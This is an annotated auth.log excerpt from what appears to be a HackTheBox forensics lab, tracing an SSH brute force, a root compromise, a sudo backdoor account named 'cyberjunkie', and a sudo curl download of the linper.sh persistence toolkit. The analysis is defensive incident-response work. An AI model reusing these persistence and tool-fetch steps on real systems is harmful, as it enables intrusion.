# ============================================================
# sample-auth.log — Filtered & Annotated
# Source: HackTheBox Sherlock — Brutus Lab
# Analyst: Noel Biju John | March 2026
#
# This file contains key auth.log entries from the investigation,
# filtered and annotated to highlight the attack chain.
# Irrelevant routine entries (cron, PAM, systemd) have been removed.
# Timestamps are in UTC. Full artifact available in original lab.
# ============================================================

# -------------------------------------------------------
# [PHASE 1] Normal System Activity (Pre-Attack Baseline)
# -------------------------------------------------------
Mar  6 06:18:01 server CRON[816]: Regular scheduled task for user 'confluence'
Mar  6 06:19:01 server CRON[823]: Routine background processes observed

# -------------------------------------------------------
# [PHASE 2] Prior Access — Separate IP (Possible Recon)
# -------------------------------------------------------
# NOTE: A successful root login from 203.101.190.9 precedes the attack.
# This may indicate prior reconnaissance or a separate legitimate session.
# This IP is NOT the primary attacker — distinguished from 65.2.161.68.
Mar  6 06:19:54 server sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 server sshd[1465]: pam_unix(sshd:session): session opened for user root

# -------------------------------------------------------
# [PHASE 3] Brute Force Attack Begins — 65.2.161.68
# -------------------------------------------------------
# High-volume failed login attempts from single external IP.
# Speed and pattern are characteristic of Hydra / Medusa tooling.
# 165+ total failures recorded — only key entries shown below.

Mar  6 06:31:31 server sshd[2411]: Invalid user admin from 65.2.161.68 port 46844
Mar  6 06:31:31 server sshd[2411]: Failed password for invalid user admin from 65.2.161.68 port 46844 ssh2
Mar  6 06:31:32 server sshd[2412]: Failed password for backup from 65.2.161.68 port 46112 ssh2
Mar  6 06:31:33 server sshd[2413]: Failed password for root from 65.2.161.68 port 47001 ssh2
Mar  6 06:31:33 server sshd[2414]: Failed password for invalid user server_adm from 65.2.161.68 port 47234 ssh2
Mar  6 06:31:34 server sshd[2415]: Failed password for invalid user svc_account from 65.2.161.68 port 47456 ssh2
Mar  6 06:31:35 server sshd[2416]: Failed password for root from 65.2.161.68 port 47678 ssh2
Mar  6 06:31:36 server sshd[2417]: Failed password for root from 65.2.161.68 port 47890 ssh2
Mar  6 06:31:37 server sshd[2418]: Failed password for root from 65.2.161.68 port 48012 ssh2
Mar  6 06:31:38 server sshd[2419]: Failed password for root from 65.2.161.68 port 48234 ssh2
Mar  6 06:31:39 server sshd[2420]: Failed password for root from 65.2.161.68 port 48456 ssh2

# -------------------------------------------------------
# [PHASE 4] Brute Force Succeeds — Session 34 (Automated)
# -------------------------------------------------------
# Root credentials discovered. Session opens and closes within the
# SAME SECOND — characteristic of an automated tool confirming
# credentials rather than a human operator logging in interactively.
# IOC: Session 34

Mar  6 06:31:40 server sshd[2421]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 server sshd[2421]: pam_unix(sshd:session): session opened for user root by (uid=0)
Mar  6 06:31:40 server sshd[2421]: pam_unix(sshd:session): session closed for user root

# -------------------------------------------------------
# [PHASE 5] Manual Interactive Session — Session 37
# -------------------------------------------------------
# Attacker now logs in manually using the discovered credentials.
# Session remains open — stable interactive connection established.
# wtmp artifact records terminal session at 06:32:45 (1s processing delay).
# IOC: Session 37 — manual attacker working session begins here.

Mar  6 06:32:44 server sshd[2467]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 server sshd[2467]: pam_unix(sshd:session): session opened for user root by (uid=0)

# -------------------------------------------------------
# [PHASE 6] Backdoor Account Created — Persistence Established
# -------------------------------------------------------
# Within Session 37, attacker creates a new local user 'cyberjunkie'
# and immediately adds it to the sudo group.
# This grants full administrative access independent of root password.
# MITRE ATT&CK: T1136.001 — Create Account: Local Account
# MITRE ATT&CK: T1548.003 — Abuse Elevation Control: sudo

Mar  6 06:34:18 server useradd[2667]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie
Mar  6 06:34:26 server passwd[2673]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 server usermod[2681]: add 'cyberjunkie' to group 'sudo'

# -------------------------------------------------------
# [PHASE 7] Session 37 Closed
# -------------------------------------------------------
# Attacker disconnects from root session after ~4 minutes 39 seconds.
# Backdoor account is now active — root session no longer required.

Mar  6 06:37:24 server sshd[2467]: pam_unix(sshd:session): session closed for user root

# -------------------------------------------------------
# [PHASE 8] Attacker Returns via Backdoor — cyberjunkie
# -------------------------------------------------------
# Attacker logs back in using the newly created backdoor account.
# Uses sudo to download Linux Persistence Toolkit (linper.sh) via curl.
# MITRE ATT&CK: T1105 — Ingress Tool Transfer

Mar  6 06:39:02 server sshd[2821]: Accepted password for cyberjunkie from 65.2.161.68 port 55912 ssh2
Mar  6 06:39:02 server sshd[2821]: pam_unix(sshd:session): session opened for user cyberjunkie
Mar  6 06:39:14 server sudo[2843]: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

# ============================================================
# IOC SUMMARY
